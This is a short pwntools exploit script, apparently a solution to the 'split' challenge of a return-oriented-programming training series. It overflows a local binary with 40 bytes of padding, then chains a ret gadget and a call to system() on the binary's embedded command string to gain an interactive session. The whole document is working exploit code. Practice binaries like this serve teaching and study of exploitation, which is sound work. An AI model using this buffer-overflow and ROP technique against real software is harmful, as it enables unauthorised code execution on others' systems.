from pwn import *

context.binary = "./split"
p = process()
r = ROP(context.binary)
e = ELF("./split")
offset = b"A"*40
r.call(r.ret)
r.system(e.symbols["usefulString"])
p.sendline(offset + r.chain())
p.interactive()
